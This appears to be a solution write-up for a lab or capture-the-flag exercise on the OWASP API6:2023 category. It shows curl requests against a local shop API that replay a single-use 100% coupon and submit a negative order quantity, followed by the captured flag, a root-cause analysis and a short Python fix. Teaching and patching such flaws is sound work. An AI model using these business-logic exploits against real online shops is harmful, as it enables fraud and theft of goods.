# Solution: API6:2023 Unrestricted Access to Sensitive Business Flows

## 1. Walkthrough & Exploitation

### Step 1: Replay Single-Use Discount Coupon
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/checkout/apply-coupon \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code": "DEVTEST100", "cart_total": 500.0}'
```

### Exploit Evidence
```json
{
  "status": "coupon_applied",
  "coupon_code": "DEVTEST100",
  "discount_percent": 100.0,
  "discount_amount": 500.0,
  "new_total": 0.0,
  "flag": "FLAG{API6_BUSINESS_FLOW_COUPON_REPLAYED_8819}"
}
```

### Step 2: Negative Quantity Checkout
```bash
curl -s -X POST http://127.0.0.1:8000/api/v1/checkout/process-order \
  -H "Authorization: Bearer <ALICE_ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"product_id": 1, "quantity": -5}], "shipping_address": "123 Exploit Way"}'
```

---

## 2. Root Cause Analysis
Coupon redemption logic failed to track per-account redemption histories and allowed negative integers in line item quantity fields without validation.

---

## 3. Patched Implementation
```python
# FIX: API6-Business-Flow
if coupon.code in user_history:
    raise HTTPException(status_code=400, detail="Coupon code has already been redeemed.")
for item in payload.items:
    if item.quantity <= 0:
        raise HTTPException(status_code=400, detail="Quantity must be >= 1.")
```
